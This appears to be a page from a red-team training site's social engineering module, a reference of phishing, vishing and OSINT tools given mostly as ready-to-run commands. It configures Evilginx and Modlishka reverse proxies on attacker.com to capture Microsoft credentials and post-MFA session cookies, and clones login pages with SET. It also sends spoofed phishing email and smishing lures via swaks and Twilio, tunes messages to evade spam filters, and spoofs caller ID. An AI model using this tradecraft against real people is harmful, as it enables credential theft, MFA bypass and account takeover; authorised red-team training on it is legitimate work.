---
layout: training-page
title: "SE Tools Reference — Red Team Academy"
module: "Social Engineering"
tags:
  - social-engineering
  - tools
  - phishing
  - vishing
page_key: "se-tools"
---
<h1>SE Tools Reference</h1>
<p>A reference for the primary tooling used across social engineering operations — phishing frameworks, credential capture, infrastructure, and OSINT.</p>

<h2>Phishing Frameworks</h2>
<h3>GoPhish</h3>
<pre><code># Purpose: phishing campaign management — tracking, templates, results dashboard
# See: c2-frameworks/gophish for full guide

# Quick start
./gophish
# Admin UI: https://localhost:3333 (default admin / gophish)

# Key features:
# - Email templates with variable substitution {% raw %}{{.FirstName}}, {{.Email}}{% endraw %}
# - Landing page cloning
# - Per-target tracking links
# - Campaign results dashboard (sent, opened, clicked, submitted)
# - Credential capture</code></pre>

<h3>Evilginx</h3>
<pre><code># Purpose: AiTM (Adversary-in-the-Middle) — captures credentials AND session cookies
# Bypasses MFA by intercepting the authenticated session token
# See: c2-frameworks/evilginx for full guide

# Critical advantage over GoPhish:
# GoPhish captures credentials only (useless against MFA)
# Evilginx captures the post-MFA session cookie = full account access

evilginx2
: config domain attacker.com
: config ip 1.2.3.4
: phishlets hostname o365 login.attacker.com
: phishlets enable o365
: lures create o365
: lures get-url 0</code></pre>

<h3>Modlishka</h3>
<pre><code># Purpose: reverse proxy phishing — similar to Evilginx, AiTM capability
# github.com/drk1wi/Modlishka

./Modlishka \
  -proxyDomain attacker.com \
  -target microsoft.com \
  -listeningPort 443 \
  -cert /path/to/cert.pem \
  -certKey /path/to/key.pem</code></pre>

<h2>Infrastructure Tools</h2>
<h3>swaks — SMTP Testing</h3>
<pre><code># Test mail delivery and authentication
swaks --to target@corp.com \
      --from spoofed@attacker.com \
      --server mail.attacker.com \
      --auth LOGIN \
      --tls \
      --header "Subject: IT: Action Required" \
      --body "Please verify your account at https://attacker.com"

# Test SPF/DKIM/DMARC compliance
swaks --to test@mail-tester.com --from noreply@attacker.com \
      --server mail.attacker.com</code></pre>

<h3>mail-tester.com</h3>
<pre><code># Free spam score checker
# 1. Go to mail-tester.com — get a unique test address
# 2. Send your phishing email to that address
# 3. Check score — aim for 9+/10 before real send
# Checks: SPF, DKIM, DMARC, blacklists, content score, HTML quality</code></pre>

<h3>YOURLS — URL Shortener</h3>
<pre><code># Self-hosted URL shortener for clean phishing links
# github.com/YOURLS/YOURLS
# Install on VPS — creates yourshortdomain.com/abc

# Hides the real destination domain
# Track click-through rates with built-in analytics</code></pre>

<h2>Social Engineering Toolkit (SET)</h2>
<pre><code># See: web/social-engineer-toolkit for full guide
# Purpose: automated attack vectors including credential harvesting, payloads

setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# URL to clone: https://login.microsoftonline.com

# SET auto-clones, hosts locally, captures submissions
# Limitations: no per-target tracking, less polished than GoPhish</code></pre>

<h2>Vishing Tools</h2>
<h3>FreePBX / Asterisk</h3>
<pre><code># Self-hosted PBX for spoofed outbound calls
# Requires SIP trunk (VoIP.ms, Twilio SIP, etc.)

# Install on VPS
apt install asterisk freepbx

# Configure trunk with spoofed CallerID
# Set outbound CallerID to target company's number
# Record and playback capabilities for automated vishing</code></pre>

<h3>Twilio</h3>
<pre><code"># Programmatic calls and SMS — twilio.com
pip install twilio

from twilio.rest import Client
client = Client(account_sid, auth_token)

# Voice call
call = client.calls.create(
    twiml='&lt;Response&gt;&lt;Say&gt;Hello, this is IT support.&lt;/Say&gt;&lt;/Response&gt;',
    to="+15551234567",
    from_="+15559876543"
)

# SMS
msg = client.messages.create(
    body="Your VPN certificate expires today. Renew: https://vpn.attacker.com",
    from_="+15559876543",
    to="+15551234567"
)</code></pre>

<h2>OSINT Tools for SE</h2>
<pre><code>theHarvester  — email enumeration from multiple sources
hunter.io     — email format discovery and verification
LinkedIn      — org chart, tools, employee profiling
Maltego       — relationship mapping
OSINT Framework — osintframework.com
Spokeo/Whitepages — phone number lookup
haveibeenpwned — breach checking for targets
trufflehog    — git secret scanning for intelligence gathering</code></pre>

<h2>Campaign Tracking Spreadsheet Template</h2>
<pre><code">Target Name | Email | Sent | Opened | Clicked | Submitted | Notes
------------|-------|------|--------|---------|-----------|------
John Smith  | j@c.c | Y    | Y      | Y       | N         | Clicked, hesitated at form
Jane Doe    | j@c.c | Y    | N      | N       | N         | Likely filtered
...</code></pre>

<h2>Resources</h2>
<ul>
  <li>GoPhish — <code>github.com/gophish/gophish</code></li>
  <li>Evilginx — <code>github.com/kgretzky/evilginx2</code></li>
  <li>Modlishka — <code>github.com/drk1wi/Modlishka</code></li>
  <li>SET — <code>github.com/trustedsec/social-engineer-toolkit</code></li>
  <li>YOURLS — <code>yourls.org</code></li>
  <li>Twilio — <code>twilio.com</code></li>
</ul>
